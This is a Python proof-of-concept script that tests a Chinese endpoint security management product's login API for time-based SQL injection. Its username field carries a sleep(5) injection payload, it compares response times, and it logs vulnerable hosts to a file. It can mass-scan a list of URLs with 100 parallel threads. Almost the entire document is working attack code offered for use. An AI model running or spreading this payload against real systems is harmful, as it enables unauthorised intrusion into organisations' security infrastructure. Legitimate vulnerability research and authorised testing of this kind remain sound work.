import sys, argparse, requests, re, time
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool
def banner():
    test = """
 ░▒▓███████▓▒░░▒▓██████▓▒░░▒▓█▓▒░        
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
 ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
       ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
       ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓████████▓▒░ 
                ░▒▓█▓▒░                  
                 ░▒▓██▓▒░             
                                   author:sanhua
                                   date:2024-09-03
                                   version:1.0
                    
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="辰信景云终端安全管理系统sql注入poc")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please enter url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please enter file')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    if not target:
        print("目标 URL 不能为空")
        return
    print(f"正在测试 {target} 是否存在延时注入漏洞...")
    headers = {
        "Content-Length": "102",
        "Accept": "application/json,text/javascript,*/*;q=0.01",
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
        "Accept-Encoding": "gzip,deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
    }
    data = {
        "captcha":"",
        "password":"21232f297a57a5a743894a0e4a801fc3",
        "username":"admin'and(select*from(select+sleep(5))a)='"

    }
    payload = '/api/user/login'
    proxies = {
        'http': 'http://127.0.0.1:7890',
        'https': 'http://127.0.0.1:7890'
    }
    try:
        res1 = requests.post(url=target + payload, data=data, headers=headers, verify=False, timeout=15)
        res2 = requests.get(url=target, data=data, headers=headers, verify=False, timeout=15)
        time1 = res1.elapsed.total_seconds()  # 响应的时间
        time2 = res2.elapsed.total_seconds()
        if time1 - time2 >= 5 and time1 > 5:
            print(f"[+] 该 {target} 存在延时注入漏洞")
            with open('result4.txt', 'a', encoding='utf-8') as f:
                f.write(target + '\n')
        else:
            print(f"[-] 该 {target} 不存在延时注入漏洞")
    except Exception as e:
        print(f"[-] 该 {target} 请求失败: {e}")


if __name__ == '__main__':
    main()